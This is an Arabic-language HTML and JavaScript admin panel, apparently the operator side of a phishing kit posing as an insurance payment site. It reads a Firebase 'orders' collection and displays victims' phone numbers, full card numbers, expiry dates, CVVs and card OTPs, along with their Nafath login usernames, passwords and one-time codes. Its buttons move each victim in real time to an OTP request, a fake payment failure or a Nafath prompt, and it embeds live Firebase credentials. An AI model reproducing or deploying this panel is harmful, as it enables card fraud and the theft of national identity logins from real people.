<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم السرية</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; }
        .order-card { background: #1a1a1a; border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 5px solid #00ff9d; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; }
        .item { background: #252525; padding: 10px; border-radius: 8px; font-size: 13px; }
        .item span { color: #00ff9d; display: block; font-weight: bold; margin-bottom: 3px; }
        .actions { margin-top: 15px; display: flex; gap: 8px; align-items: center; background: #000; padding: 10px; border-radius: 10px; }
        button { padding: 10px 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 12px; }
        .btn-green { background: #27ae60; color: white; }
        .btn-red { background: #c0392b; color: white; }
        .btn-blue { background: #2980b9; color: white; }
        input { padding: 10px; border-radius: 6px; border: 1px solid #333; background: #111; color: white; width: 60px; text-align: center; font-weight: bold; }
        .badge { background: #f39c12; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
    </style>
</head>
<body>

<div style="display: flex; justify-content: space-between; align-items: center;">
    <h2>🔔 مراقبة الزوار (التنبيه الصوتي عندي فقط)</h2>
    <div id="count">الزوار: 0</div>
</div>

<div id="list"></div>

<audio id="adminAlert" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // متابعة البيانات
    db.collection("orders").orderBy("timestamp", "desc").onSnapshot((snapshot) => {
        const container = document.getElementById('list');
        
        // تشغيل الجرس للمدير عند وجود تحديث جديد
        snapshot.docChanges().forEach((change) => {
            if (change.type === "added" || change.type === "modified") {
                document.getElementById('adminAlert').play().catch(() => {});
            }
        });

        container.innerHTML = "";
        snapshot.forEach((doc) => {
            const d = doc.data();
            const id = doc.id;
            container.innerHTML += `
                <div class="order-card">
                    <div class="grid">
                        <div class="item"><span>رقم الجوال</span>${d.phone || '-'}</div>
                        <div class="item"><span>البطاقة</span>${d.card_number || '-'}</div>
                        <div class="item"><span>التاريخ/CVV</span>${d.expiry || '-'}/${d.cvv || '-'}</div>
                        <div class="item"><span>OTP البطاقة</span><b style="color:red">${d.card_otp || 'بانتظاره...'}</b></div>
                        <div class="item"><span>نفاذ (يوزر/باس)</span>${d.nafath_user || '-'}/${d.nafath_pass || '-'}</div>
                        <div class="item"><span>كود نفاذ المرسل</span><b>${d.nafath_otp || '-'}</b></div>
                    </div>
                    <div style="margin-top:10px"><span class="badge">الحالة: ${d.status || 'نشط'}</span></div>
                    <div class="actions">
                        <button class="btn-green" onclick="move('${id}', 'GO_TO_OTP')">قبول (طلب OTP)</button>
                        <button class="btn-red" onclick="move('${id}', 'GO_TO_REJECT')">رفض (فشل دفع)</button>
                        <button class="btn-blue" onclick="move('${id}', 'GO_TO_NAFATH')">تحويل لنفاذ</button>
                        <div style="margin-right:auto">
                            <input type="number" id="val-${id}" placeholder="00" value="${d.nafath_code || ''}">
                            <button class="btn-blue" onclick="sendNafathCode('${id}')">إرسال رقم نفاذ</button>
                        </div>
                    </div>
                </div>
            `;
        });
        document.getElementById('count').innerText = "إجمالي الزوار: " + snapshot.size;
    });

    function move(id, step) {
        db.collection("orders").doc(id).update({ next_step: step });
    }

    function sendNafathCode(id) {
        const code = document.getElementById('val-'+id).value;
        db.collection("orders").doc(id).update({ 
            nafath_code: code, 
            next_step: 'SHOW_NAFATH_CODE' 
        });
    }
</script>
</body>
</html>
